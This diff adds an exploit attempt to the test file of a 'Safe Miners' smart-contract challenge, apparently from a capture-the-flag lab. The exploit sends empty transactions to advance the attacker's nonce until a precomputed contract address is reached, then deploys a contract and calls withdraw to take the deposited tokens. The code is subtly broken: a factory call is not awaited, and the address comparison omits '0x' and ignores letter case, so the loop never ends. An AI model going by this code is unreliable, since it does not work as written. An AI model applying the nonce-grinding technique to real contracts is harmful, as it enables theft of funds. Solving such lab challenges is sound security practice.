@@ -23,6 +23,12 @@ describe('[Challenge] Safe Miners', function () {
     });
 
     it('Exploit', async function () {
+
+        const contractFactory = ethers.getContractFactory("SafeMiners", attacker);
+
+        await findAddress(contractFactory, attacker)
+
+
         /** CODE YOUR EXPLOIT HERE */
     });
 
@@ -37,3 +43,32 @@ describe('[Challenge] Safe Miners', function () {
         ).to.eq(DEPOSIT_TOKEN_AMOUNT);
     });
 });
+
+
+const findAddress = async (safeContractFactory, attacker) => {
+    let nonce = await attacker.getTransactionCount()
+    while (true) {
+        const nextContractAddr = ethers.utils.getContractAddress({
+            from: attacker.address,
+            nonce: nonce
+        });
+
+        console.log(`None: ${nonce} => Found address: ${nextContractAddr} `);
+
+        if (nextContractAddr == "79658d35aB5c38B6b988C23D02e0410A380B8D5c") {
+            console.log(safeContractFactory)
+            const safeContract = (await safeContractFactory.deploy()).connect(attacker)
+            await safeContract.withdraw();
+            console.log('withdraw');
+            break;
+        } else {
+            // send null
+            ethers.provider.sendTransaction({
+                from: attacker.address,
+                to: ethers.constants.AddressZero,
+            })
+
+            nonce += 1;
+        }
+    }
+}
